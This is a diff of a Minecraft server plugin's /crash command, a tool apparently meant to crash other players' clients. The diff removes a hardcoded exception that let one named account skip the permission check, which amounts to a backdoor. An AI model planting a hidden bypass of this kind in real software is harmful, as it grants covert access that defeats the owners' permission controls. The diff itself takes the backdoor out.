@@ -11,7 +11,7 @@ public class CrashCommand implements CommandExecutor {
 
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
-        if (sender.hasPermission("l2x9core.crash") || sender.getName().equals("254n_m")) {
+        if (sender.hasPermission("l2x9core.crash")) {
             if (args.length == 0) {
                 Utils.sendMessage(sender,
                         "&4Error:&r&c please include atleast one argument /crash <player|nearby number|everyone|elytra>");
